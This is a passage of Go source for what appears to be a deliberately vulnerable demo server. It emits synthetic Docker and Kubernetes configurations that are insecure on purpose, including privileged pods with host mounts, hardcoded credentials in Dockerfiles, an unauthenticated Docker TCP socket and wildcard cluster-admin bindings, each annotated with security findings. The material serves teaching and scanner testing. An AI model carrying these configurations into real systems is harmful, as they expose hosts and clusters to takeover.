		"vulnerability_scan": []map[string]interface{}{
			{
				"severity": "CRITICAL",
				"count":    127,
				"example":  "CVE-2021-44228 (log4j) - CVSS 10.0",
			},
			{
				"severity": "HIGH",
				"count":    284,
				"example":  "CVE-2022-0778 (OpenSSL) - CVSS 7.5",
			},
			{
				"severity": "MEDIUM",
				"count":    412,
				"example":  "CVE-2021-3520 (lz4) - CVSS 5.5",
			},
		},
		"findings": []string{
			"CRIT: Base image ubuntu:14.04 is EOL (end of life since April 2019)",
			"CRIT: 127 critical vulnerabilities in image",
			"CRIT: No version pinning on apt-get packages",
			"WARN: SSH server installed in container (unnecessary attack surface)",
			"WARN: Development tools (vim, wget) present in production image",
			"CRIT: Multiple unnecessary ports exposed (22, 8080, 8443)",
			"WARN: Using pip instead of requirements.txt with pinned hashes",
			"CRIT: Image size 847MB - should use minimal base image",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// D03: Excessive Capabilities
// ---------------------------------------------------------------------------

func (h *Handler) serveDockerExcessiveCaps(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	containerID := h.randomHex(rng, 64)
	ts := time.Now().UTC().Format(time.RFC3339Nano)

	resp := toJSON(map[string]interface{}{
		"Id":      containerID,
		"Created": ts,
		"Name":    "/prod-monitoring-" + h.randomHex(rng, 6),
		"State": map[string]interface{}{
			"Status":  "running",
			"Running": true,
			"Pid":     rng.Intn(32000) + 1000,
		},
		"HostConfig": map[string]interface{}{
			"Privileged": true,
			"CapAdd": []string{
				"SYS_ADMIN",
				"NET_ADMIN",
				"SYS_PTRACE",
				"SYS_MODULE",
				"DAC_READ_SEARCH",
				"NET_RAW",
				"SYS_RAWIO",
			},
			"CapDrop":          "[]",
			"SecurityOpt":      "[]",
			"AppArmorProfile":  "unconfined",
			"SeccompProfile":   "unconfined",
			"ReadonlyRootfs":   false,
			"UsernsMode":       "",
		},
		"Mounts": []map[string]interface{}{
			{
				"Type":        "bind",
				"Source":      "/",
				"Destination": "/host",
				"Mode":        "rw",
				"RW":          true,
			},
			{
				"Type":        "bind",
				"Source":      "/var/run/docker.sock",
				"Destination": "/var/run/docker.sock",
				"Mode":        "rw",
				"RW":          true,
			},
		},
		"findings": []string{
			"CRIT: Container running with --privileged flag - full host access",
			"CRIT: SYS_ADMIN capability grants near-root host access",
			"CRIT: SYS_MODULE allows loading kernel modules from container",
			"CRIT: Docker socket mounted - container can control Docker daemon",
			"CRIT: Host root filesystem mounted read-write at /host",
			"WARN: AppArmor profile set to 'unconfined'",
			"WARN: Seccomp profile disabled",
			"CRIT: No capabilities dropped - container has all Linux capabilities",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// D04: Insecure Registry
// ---------------------------------------------------------------------------

func (h *Handler) serveDockerInsecureRegistry(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	registryHost := "registry." + h.domains[rng.Intn(len(h.domains))]

	resp := toJSON(map[string]interface{}{
		"registry_config": map[string]interface{}{
			"endpoint":     "http://" + registryHost + ":5000",
			"protocol":     "HTTP",
			"tls_enabled":  false,
			"tls_verify":   false,
			"auth_enabled": false,
		},
		"daemon_config": map[string]interface{}{
			"insecure-registries": []string{
				registryHost + ":5000",
				"10.0.0.0/8",
				"172.16.0.0/12",
			},
			"disable-content-trust": true,
		},
		"content_trust": map[string]interface{}{
			"DOCKER_CONTENT_TRUST":        "0",
			"DOCKER_CONTENT_TRUST_SERVER": "",
			"notary_enabled":              false,
			"image_signing":               false,
		},
		"image_policy": map[string]interface{}{
			"allowed_registries":   "any",
			"tag_policy":           "none",
			"digest_verification":  false,
			"vulnerability_scan":   false,
			"admission_controller": false,
		},
		"recent_pulls": []map[string]interface{}{
			{
				"image":    registryHost + ":5000/webapp:latest",
				"digest":   "sha256:" + h.randomHex(rng, 64),
				"verified": false,
				"signed":   false,
			},
			{
				"image":    registryHost + ":5000/postgres:dev",
				"digest":   "sha256:" + h.randomHex(rng, 64),
				"verified": false,
				"signed":   false,
			},
		},
		"findings": []string{
			"CRIT: Registry using HTTP instead of HTTPS - traffic is unencrypted",
			"CRIT: Docker Content Trust disabled - images not verified",
			"CRIT: No authentication required to pull/push images",
			"WARN: Insecure registries configured for entire private subnets",
			"CRIT: No image signing or verification in place",
			"WARN: No admission controller to enforce image policies",
			"WARN: Using :latest and :dev tags instead of immutable digests",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// D05: Hardcoded Secrets
// ---------------------------------------------------------------------------

func (h *Handler) serveDockerHardcodedSecrets(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	imageID := "sha256:" + h.randomHex(rng, 64)

	resp := toJSON(map[string]interface{}{
		"Id":       imageID,
		"RepoTags": "prod-api:v2.3.1",
		"Dockerfile": strings.Join([]string{
			"FROM node:18-alpine",
			"ENV PASSWORD=admin123",
			"ENV DB_PASSWORD=SuperSecret_" + h.randomHex(rng, 12),
			"ENV API_KEY=" + h.randomHex(rng, 32),
			"ENV JWT_SECRET=mysecretkey_" + h.randomHex(rng, 16),
			"ENV AWS_ACCESS_KEY_ID=AKIA" + strings.ToUpper(h.randomHex(rng, 16)),
			"ENV AWS_SECRET_ACCESS_KEY=" + h.randomHex(rng, 40),
			"COPY .env /app/.env",
			"COPY id_rsa /root/.ssh/id_rsa",
			"RUN echo 'root:" + h.randomHex(rng, 8) + "' | chpasswd",
			"WORKDIR /app",
			"COPY package*.json ./",
			"RUN npm install",
			"COPY . .",
			"EXPOSE 3000",
			"CMD [\"node\", \"server.js\"]",
		}, "\n"),
		"history": []map[string]interface{}{
			{
				"layer":   "sha256:" + h.randomHex(rng, 64),
				"command": "ENV PASSWORD=admin123",
				"size":    0,
			},
			{
				"layer":   "sha256:" + h.randomHex(rng, 64),
				"command": "COPY .env /app/.env",
				"size":    1024,
			},
			{
				"layer":   "sha256:" + h.randomHex(rng, 64),
				"command": "COPY id_rsa /root/.ssh/id_rsa",
				"size":    3389,
			},
		},
		"env_inspection": []string{
			"PASSWORD=admin123",
			"DB_PASSWORD=SuperSecret_" + h.randomHex(rng, 12),
			"API_KEY=" + h.randomHex(rng, 32),
			"JWT_SECRET=mysecretkey_" + h.randomHex(rng, 16),
			"AWS_ACCESS_KEY_ID=AKIA" + strings.ToUpper(h.randomHex(rng, 16)),
			"AWS_SECRET_ACCESS_KEY=" + h.randomHex(rng, 40),
		},
		"findings": []string{
			"CRIT: Passwords hardcoded as ENV directives in Dockerfile",
			"CRIT: AWS credentials baked into image layers (visible in history)",
			"CRIT: SSH private key copied into image",
			"CRIT: .env file with secrets included in image",
			"WARN: Root password set inline in Dockerfile",
			"CRIT: Secrets persist in image layers even if later deleted",
			"WARN: Should use Docker secrets, Vault, or runtime injection instead",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// D06: Running as Root / No USER Directive
// ---------------------------------------------------------------------------

func (h *Handler) serveDockerNoUser(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	containerID := h.randomHex(rng, 64)
	ts := time.Now().UTC().Format(time.RFC3339Nano)

	resp := toJSON(map[string]interface{}{
		"Id":      containerID,
		"Created": ts,
		"Name":    "/prod-backend-" + h.randomHex(rng, 6),
		"Config": map[string]interface{}{
			"User":       "",
			"Hostname":   h.randomHex(rng, 12),
			"Domainname": "",
		},
		"State": map[string]interface{}{
			"Status":  "running",
			"Running": true,
			"Pid":     rng.Intn(32000) + 1000,
		},
		"process_list": []map[string]interface{}{
			{
				"UID":  "root",
				"PID":  "1",
				"CMD":  "node /app/server.js",
			},
			{
				"UID":  "root",
				"PID":  "24",
				"CMD":  "sh -c cron && tail -f /var/log/cron.log",
			},
			{
				"UID":  "root",
				"PID":  "31",
				"CMD":  "/usr/sbin/cron",
			},
		},
		"Dockerfile": strings.Join([]string{
			"FROM node:18",
			"# No USER directive - runs as root",
			"WORKDIR /app",
			"COPY package*.json ./",
			"RUN npm install",
			"COPY . .",
			"RUN chmod -R 777 /app",
			"EXPOSE 3000",
			"CMD [\"node\", \"server.js\"]",
		}, "\n"),
		"user_namespace_remapping": false,
		"root_capabilities": []string{
			"CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_FOWNER",
			"CAP_FSETID", "CAP_KILL", "CAP_SETGID",
			"CAP_SETUID", "CAP_SETPCAP", "CAP_NET_BIND_SERVICE",
			"CAP_NET_RAW", "CAP_SYS_CHROOT", "CAP_MKNOD",
			"CAP_AUDIT_WRITE", "CAP_SETFCAP",
		},
		"findings": []string{
			"CRIT: Container running as root (UID 0) - no USER directive in Dockerfile",
			"CRIT: All processes running as root inside container",
			"WARN: chmod 777 on application directory - world-writable files",
			"CRIT: Default root capabilities retained (14 capabilities)",
			"WARN: User namespace remapping not enabled",
			"WARN: If container escapes, attacker has root on host",
			"CRIT: cron running as root in container - unnecessary service",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// D07: Writable Root Filesystem
// ---------------------------------------------------------------------------

func (h *Handler) serveDockerWritableRootfs(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	containerID := h.randomHex(rng, 64)
	ts := time.Now().UTC().Format(time.RFC3339Nano)

	resp := toJSON(map[string]interface{}{
		"Id":      containerID,
		"Created": ts,
		"Name":    "/prod-api-" + h.randomHex(rng, 6),
		"HostConfig": map[string]interface{}{
			"ReadonlyRootfs": false,
		},
		"filesystem_audit": []map[string]interface{}{
			{
				"path":        "/etc/shadow",
				"permissions": "-rw-r-----",
				"writable":    true,
				"risk":        "CRITICAL: Password file writable from container",
			},
			{
				"path":        "/etc/passwd",
				"permissions": "-rw-r--r--",
				"writable":    true,
				"risk":        "HIGH: User database writable - can add new users",
			},
			{
				"path":        "/usr/bin",
				"permissions": "drwxr-xr-x",
				"writable":    true,
				"risk":        "HIGH: System binaries writable - path injection possible",
			},
			{
				"path":        "/etc/crontab",
				"permissions": "-rw-r--r--",
				"writable":    true,
				"risk":        "HIGH: Cron configuration writable - persistence mechanism",
			},
			{
				"path":        "/root/.ssh",
				"permissions": "drwx------",
				"writable":    true,
				"risk":        "HIGH: SSH directory writable - can add authorized keys",
			},
		},
		"writable_sensitive_paths": 47,
		"tmpfs_mounts":             0,
		"volume_mounts":            0,
		"findings": []string{
			"CRIT: Root filesystem is writable (--read-only not set)",
			"CRIT: /etc/shadow writable - attacker can modify password hashes",
			"CRIT: /etc/passwd writable - attacker can add privileged users",
			"HIGH: /usr/bin writable - binaries can be replaced with malicious versions",
			"WARN: No tmpfs mounts for /tmp or /var/tmp",
			"WARN: 47 sensitive paths are writable inside container",
			"CRIT: Writable rootfs enables persistence after exploitation",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// D08: No Health Check
// ---------------------------------------------------------------------------

func (h *Handler) serveDockerNoHealthcheck(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	containerID := h.randomHex(rng, 64)
	ts := time.Now().UTC().Format(time.RFC3339Nano)

	resp := toJSON(map[string]interface{}{
		"Id":      containerID,
		"Created": ts,
		"Name":    "/prod-payment-svc-" + h.randomHex(rng, 6),
		"State": map[string]interface{}{
			"Status":  "running",
			"Running": true,
			"Health":  "none",
		},
		"Config": map[string]interface{}{
			"Healthcheck": map[string]interface{}{
				"Test":     "[]",
				"Interval": 0,
				"Timeout":  0,
				"Retries":  0,
			},
		},
		"HostConfig": map[string]interface{}{
			"RestartPolicy": map[string]interface{}{
				"Name":              "",
				"MaximumRetryCount": 0,
			},
			"OomKillDisable": false,
			"OomScoreAdj":    0,
		},
		"Dockerfile": strings.Join([]string{
			"FROM python:3.9-slim",
			"# No HEALTHCHECK directive",
			"WORKDIR /app",
			"COPY requirements.txt .",
			"RUN pip install -r requirements.txt",
			"COPY . .",
			"# No signal handling for graceful shutdown",
			"CMD python app.py",
		}, "\n"),
		"uptime_info": map[string]interface{}{
			"started_at":     ts,
			"last_checked":   "never",
			"health_checks":  0,
			"restarts":       0,
			"oom_killed":     false,
		},
		"findings": []string{
			"CRIT: No HEALTHCHECK defined - orchestrator cannot detect unhealthy state",
			"CRIT: No restart policy - container stays down after crash",
			"WARN: No signal handling - SIGTERM not caught for graceful shutdown",
			"WARN: Using shell form CMD instead of exec form - PID 1 issues",
			"CRIT: Payment service with no health monitoring is a reliability risk",
			"WARN: No OOM score adjustment for priority management",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// D09: Insecure Daemon Defaults
// ---------------------------------------------------------------------------

func (h *Handler) serveDockerInsecureDefaults(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)

	resp := toJSON(map[string]interface{}{
		"daemon_json": map[string]interface{}{
			"hosts":              []string{"unix:///var/run/docker.sock", "tcp://0.0.0.0:2375"},
			"tls":                false,
			"tlsverify":          false,
			"tlscacert":          "",
			"tlscert":            "",
			"tlskey":             "",
			"icc":                true,
			"ip-forward":         true,
			"iptables":           true,
			"live-restore":       false,
			"userland-proxy":     true,
			"no-new-privileges":  false,
			"userns-remap":       "",
			"log-driver":         "json-file",
			"log-level":          "info",
			"storage-driver":     "overlay2",
			"default-ulimits":    "{}",
			"selinux-enabled":    false,
			"seccomp-profile":    "",
		},
		"socket_permissions": map[string]interface{}{
			"path":   "/var/run/docker.sock",
			"owner":  "root:docker",
			"mode":   "0666",
			"risk":   "World-readable/writable Docker socket",
		},
		"tcp_endpoint": map[string]interface{}{
			"address":  "0.0.0.0:2375",
			"tls":      false,
			"exposed":  true,
			"auth":     "none",
		},
		"kernel_parameters": map[string]interface{}{
			"net.ipv4.ip_forward":             "1",
			"kernel.keys.root_maxkeys":        "1000000",
			"fs.may_detach_mounts":            "1",
			"user.max_user_namespaces":        "0",
		},
		"docker_version": "20.10.7",
		"api_version":    "1.41",
		"server_os":      "linux",
		"cgroup_driver":  "cgroupfs",
		"security_options": []string{
			"name=seccomp,profile=default",
		},
		"audit_log": h.randomHex(rng, 8),
		"findings": []string{
			"CRIT: Docker TCP socket exposed on 0.0.0.0:2375 without TLS",
			"CRIT: No TLS authentication on Docker daemon",
			"CRIT: Docker socket world-writable (0666)",
			"WARN: Inter-container communication (ICC) enabled",
			"WARN: User namespace remapping not configured",
			"WARN: SELinux not enabled",
			"WARN: No default ulimits configured",
			"CRIT: --no-new-privileges not set as default",
			"WARN: Using cgroupfs instead of systemd cgroup driver",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// D10: No Resource Limits
// ---------------------------------------------------------------------------

func (h *Handler) serveDockerNoResourceLimits(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	containerID := h.randomHex(rng, 64)
	ts := time.Now().UTC().Format(time.RFC3339Nano)

	resp := toJSON(map[string]interface{}{
		"Id":      containerID,
		"Created": ts,
		"Name":    "/prod-worker-" + h.randomHex(rng, 6),
		"HostConfig": map[string]interface{}{
			"Memory":            0,
			"MemorySwap":        0,
			"MemoryReservation": 0,
			"KernelMemory":      0,
			"NanoCpus":          0,
			"CpuShares":         0,
			"CpuPeriod":         0,
			"CpuQuota":          0,
			"CpusetCpus":        "",
			"CpusetMems":        "",
			"PidsLimit":         0,
			"BlkioWeight":       0,
			"IOMaximumBandwidth": 0,
			"IOMaximumIOps":     0,
			"Ulimits":           "[]",
		},
		"resource_usage": map[string]interface{}{
			"cpu_percent":    87.3,
			"memory_usage":   "12.4 GiB",
			"memory_limit":   "unlimited",
			"pids_current":   4821,
			"pids_limit":     "unlimited",
			"block_io_read":  "142.8 GiB",
			"block_io_write": "89.3 GiB",
			"net_io_rx":      "34.2 GiB",
			"net_io_tx":      "28.7 GiB",
		},
		"host_impact": map[string]interface{}{
			"total_host_memory": "32 GiB",
			"container_percent": "38.75%",
			"other_containers":  12,
			"host_cpu_cores":    8,
			"container_cpu":     "7 cores (87.3%)",
		},
		"findings": []string{
			"CRIT: No memory limit - container using 12.4 GiB (38.75% of host)",
			"CRIT: No CPU limit - container consuming 87.3% of host CPU",
			"CRIT: No PID limit - 4821 processes (fork bomb risk)",
			"WARN: No block I/O limits - heavy disk usage detected",
			"CRIT: No ulimits configured - file descriptor exhaustion possible",
			"WARN: Container can starve other 12 containers on same host",
			"CRIT: No memory swap limit - can use all host swap",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ===========================================================================
// OWASP Kubernetes Top 10 (2022)
// ===========================================================================

func (h *Handler) serveK8s(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("X-Glitch-Vuln", "K8s-Top-10")
	path := r.URL.Path

	switch {
	case path == "/vuln/k8s/" || path == "/vuln/k8s":
		return h.serveK8sIndex(w, r)
	case path == "/vuln/k8s/insecure-workload":
		return h.serveK8sInsecureWorkload(w, r)
	case path == "/vuln/k8s/supply-chain":
		return h.serveK8sSupplyChain(w, r)
	case path == "/vuln/k8s/overly-permissive-rbac":
		return h.serveK8sOverlyPermissiveRBAC(w, r)
	case path == "/vuln/k8s/no-network-policy":
		return h.serveK8sNoNetworkPolicy(w, r)
	case path == "/vuln/k8s/inadequate-logging":
		return h.serveK8sInadequateLogging(w, r)
	case path == "/vuln/k8s/broken-auth":
		return h.serveK8sBrokenAuth(w, r)
	case path == "/vuln/k8s/no-network-segmentation":
		return h.serveK8sNoNetworkSegmentation(w, r)
	case path == "/vuln/k8s/secrets-mismanagement":
		return h.serveK8sSecretsMismanagement(w, r)
	case path == "/vuln/k8s/misconfigured-cluster":
		return h.serveK8sMisconfiguredCluster(w, r)
	case path == "/vuln/k8s/outdated-components":
		return h.serveK8sOutdatedComponents(w, r)
	default:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, h.wrapHTML("Kubernetes - Not Found", "<p>Unknown Kubernetes vulnerability demo endpoint.</p>"))
		return http.StatusNotFound
	}
}

func (h *Handler) serveK8sIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Kubernetes Top 10 (2022)</h2>
<p>These endpoints emulate common security issues found in Kubernetes clusters.
Each response returns realistic Kubernetes API-style JSON output showing the
specific vulnerability. All data is synthetic.</p>
<h3>Vulnerability Demos</h3>
<ul>
  <li><a href="/vuln/k8s/insecure-workload">K01 - Insecure Workload Configuration</a> — Pod with hostPID, hostNetwork, privileged</li>
  <li><a href="/vuln/k8s/supply-chain">K02 - Supply Chain Vulnerabilities</a> — Deployment pulling from untrusted registry with :latest</li>
  <li><a href="/vuln/k8s/overly-permissive-rbac">K03 - Overly Permissive RBAC</a> — ClusterRoleBinding to cluster-admin for default SA</li>
  <li><a href="/vuln/k8s/no-network-policy">K04 - Lack of Centralized Policy Enforcement</a> — Namespace with 0 NetworkPolicies</li>
  <li><a href="/vuln/k8s/inadequate-logging">K05 - Inadequate Logging &amp; Monitoring</a> — No audit policy, no audit-log-path</li>
  <li><a href="/vuln/k8s/broken-auth">K06 - Broken Authentication</a> — API server with --anonymous-auth=true</li>
  <li><a href="/vuln/k8s/no-network-segmentation">K07 - Missing Network Segmentation</a> — Flat network, all namespaces communicate</li>
  <li><a href="/vuln/k8s/secrets-mismanagement">K08 - Secrets Mismanagement</a> — Secrets in plaintext in etcd, no encryption at rest</li>
  <li><a href="/vuln/k8s/misconfigured-cluster">K09 - Misconfigured Cluster Components</a> — Kubelet with --read-only-port=10255</li>
  <li><a href="/vuln/k8s/outdated-components">K10 - Outdated &amp; Vulnerable Components</a> — kubectl 1.19.0 with known CVEs</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP Kubernetes Top 10", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// K01: Insecure Workload Configuration
// ---------------------------------------------------------------------------

func (h *Handler) serveK8sInsecureWorkload(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	uid := h.randomHex(rng, 8) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 12)
	ts := time.Now().UTC().Format(time.RFC3339)

	resp := toJSON(map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "Pod",
		"metadata": map[string]interface{}{
			"name":              "prod-data-processor-" + h.randomHex(rng, 5),
			"namespace":         "production",
			"uid":               uid,
			"creationTimestamp": ts,
			"labels": map[string]interface{}{
				"app":     "data-processor",
				"env":     "production",
				"version": "1.4.2",
			},
		},
		"spec": map[string]interface{}{
			"hostPID":                true,
			"hostNetwork":            true,
			"hostIPC":                true,
			"automountServiceAccountToken": true,
			"serviceAccountName":     "default",
			"containers": []map[string]interface{}{
				{
					"name":  "processor",
					"image": "internal-registry.corp:5000/data-processor:latest",
					"securityContext": map[string]interface{}{
						"privileged":               true,
						"runAsUser":                0,
						"runAsGroup":               0,
						"allowPrivilegeEscalation": true,
						"readOnlyRootFilesystem":   false,
						"capabilities": map[string]interface{}{
							"add": []string{"SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE"},
						},
					},
					"volumeMounts": []map[string]interface{}{
						{
							"name":      "host-root",
							"mountPath": "/host",
						},
						{
							"name":      "docker-sock",
							"mountPath": "/var/run/docker.sock",
						},
					},
				},
			},
			"volumes": []map[string]interface{}{
				{
					"name": "host-root",
					"hostPath": map[string]interface{}{
						"path": "/",
						"type": "Directory",
					},
				},
				{
					"name": "docker-sock",
					"hostPath": map[string]interface{}{
						"path": "/var/run/docker.sock",
						"type": "Socket",
					},
				},
			},
		},
		"findings": []string{
			"CRIT: hostPID=true - pod can see all host processes",
			"CRIT: hostNetwork=true - pod shares host network stack",
			"CRIT: privileged=true - container has full host access",
			"CRIT: runAsUser=0 - running as root",
			"CRIT: Host root filesystem mounted at /host",
			"CRIT: Docker socket mounted - can control container runtime",
			"WARN: automountServiceAccountToken=true on default SA",
			"CRIT: allowPrivilegeEscalation=true",
			"WARN: readOnlyRootFilesystem=false",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// K02: Supply Chain Vulnerabilities
// ---------------------------------------------------------------------------

func (h *Handler) serveK8sSupplyChain(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	uid := h.randomHex(rng, 8) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 12)
	ts := time.Now().UTC().Format(time.RFC3339)
	untrustedRegistry := "docker.io/" + h.randomHex(rng, 8)

	resp := toJSON(map[string]interface{}{
		"apiVersion": "apps/v1",
		"kind":       "Deployment",
		"metadata": map[string]interface{}{
			"name":              "prod-frontend",
			"namespace":         "production",
			"uid":               uid,
			"creationTimestamp": ts,
		},
		"spec": map[string]interface{}{
			"replicas": 3,
			"selector": map[string]interface{}{
				"matchLabels": map[string]interface{}{
					"app": "frontend",
				},
			},
			"template": map[string]interface{}{
				"spec": map[string]interface{}{
					"containers": []map[string]interface{}{
						{
							"name":            "frontend",
							"image":           untrustedRegistry + "/webapp:latest",
							"imagePullPolicy": "Always",
						},
						{
							"name":            "sidecar-proxy",
							"image":           "ghcr.io/" + h.randomHex(rng, 10) + "/envoy-proxy:dev",
							"imagePullPolicy": "IfNotPresent",
						},
						{
							"name":            "log-agent",
							"image":           "quay.io/" + h.randomHex(rng, 8) + "/log-collector",
							"imagePullPolicy": "Always",
						},
					},
					"imagePullSecrets": "[]",
				},
			},
		},
		"image_analysis": []map[string]interface{}{
			{
				"image":             untrustedRegistry + "/webapp:latest",
				"tag":               "latest",
				"pinned_digest":     false,
				"signed":            false,
				"registry_trusted":  false,
				"vulnerability_scan": "never",
				"sbom_available":    false,
			},
			{
				"image":             "ghcr.io/" + h.randomHex(rng, 10) + "/envoy-proxy:dev",
				"tag":               "dev",
				"pinned_digest":     false,
				"signed":            false,
				"registry_trusted":  false,
				"vulnerability_scan": "never",
				"sbom_available":    false,
			},
			{
				"image":             "quay.io/" + h.randomHex(rng, 8) + "/log-collector",
				"tag":               "latest (implicit)",
				"pinned_digest":     false,
				"signed":            false,
				"registry_trusted":  false,
				"vulnerability_scan": "never",
				"sbom_available":    false,
			},
		},
		"admission_control": map[string]interface{}{
			"image_policy_webhook": false,
			"opa_gatekeeper":       false,
			"kyverno":              false,
			"cosign_verification":  false,
		},
		"findings": []string{
			"CRIT: Images pulled from untrusted/unknown registries",
			"CRIT: All images use mutable tags (:latest, :dev) instead of digests",
			"CRIT: No image signatures verified",
			"CRIT: No vulnerability scanning performed before deployment",
			"WARN: No SBOM (Software Bill of Materials) available for any image",
			"CRIT: No admission controller enforcing image policies",
			"WARN: No imagePullSecrets configured - using anonymous pulls",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// K03: Overly Permissive RBAC
// ---------------------------------------------------------------------------

func (h *Handler) serveK8sOverlyPermissiveRBAC(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	uid := h.randomHex(rng, 8) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 12)
	ts := time.Now().UTC().Format(time.RFC3339)

	resp := toJSON(map[string]interface{}{
		"apiVersion": "rbac.authorization.k8s.io/v1",
		"kind":       "ClusterRoleBinding",
		"metadata": map[string]interface{}{
			"name":              "default-sa-cluster-admin",
			"uid":               uid,
			"creationTimestamp": ts,
		},
		"roleRef": map[string]interface{}{
			"apiGroup": "rbac.authorization.k8s.io",
			"kind":     "ClusterRole",
			"name":     "cluster-admin",
		},
		"subjects": []map[string]interface{}{
			{
				"kind":      "ServiceAccount",
				"name":      "default",
				"namespace": "default",
			},
			{
				"kind":      "ServiceAccount",
				"name":      "default",
				"namespace": "production",
			},
			{
				"kind":      "Group",
				"name":      "system:authenticated",
				"apiGroup":  "rbac.authorization.k8s.io",
			},
		},
		"cluster_role_rules": []map[string]interface{}{
			{
				"apiGroups": "*",
				"resources": "*",
				"verbs":     "*",
			},
		},
		"rbac_audit": map[string]interface{}{
			"cluster_role_bindings_to_cluster_admin": 4,
			"service_accounts_with_cluster_admin":    7,
			"namespaces_with_default_sa_bound":       12,
			"pods_automounting_sa_token":             89,
		},
		"findings": []string{
			"CRIT: Default service account bound to cluster-admin ClusterRole",
			"CRIT: system:authenticated group has cluster-admin access (all authenticated users)",
			"CRIT: ClusterRole has wildcard permissions on all resources and verbs",
			"CRIT: Multiple namespaces' default SAs have cluster-admin privileges",
			"WARN: 89 pods automounting service account tokens unnecessarily",
			"CRIT: Any pod in default/production namespace has full cluster access",
			"WARN: 7 service accounts have cluster-admin - review necessity",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// K04: No Network Policy / Lack of Centralized Policy
// ---------------------------------------------------------------------------

func (h *Handler) serveK8sNoNetworkPolicy(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	uid := h.randomHex(rng, 8) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 12)
	ts := time.Now().UTC().Format(time.RFC3339)

	namespaces := []string{"default", "production", "staging", "monitoring", "logging", "kube-system"}
	nsList := make([]map[string]interface{}, len(namespaces))
	for i, ns := range namespaces {
		nsList[i] = map[string]interface{}{
			"name":             ns,
			"network_policies": 0,
			"pods":             rng.Intn(30) + 5,
			"services":         rng.Intn(15) + 2,
		}
	}

	resp := toJSON(map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "Namespace",
		"metadata": map[string]interface{}{
			"name":              "production",
			"uid":               uid,
			"creationTimestamp": ts,
		},
		"network_policy_summary": map[string]interface{}{
			"total_namespaces":             6,
			"namespaces_with_policies":     0,
			"total_network_policies":       0,
			"default_deny_ingress":         false,
			"default_deny_egress":          false,
		},
		"namespaces": nsList,
		"policy_engines": map[string]interface{}{
			"calico_network_policy":  false,
			"cilium_network_policy":  false,
			"opa_gatekeeper":         false,
			"kyverno":                false,
			"admission_webhooks":     0,
		},
		"findings": []string{
			"CRIT: Zero NetworkPolicies across all 6 namespaces",
			"CRIT: No default deny policy - all pod-to-pod traffic is allowed",
			"CRIT: No egress restrictions - pods can reach any external endpoint",
			"WARN: No centralized policy engine (OPA/Kyverno) installed",
			"CRIT: kube-system namespace accessible from all pods",
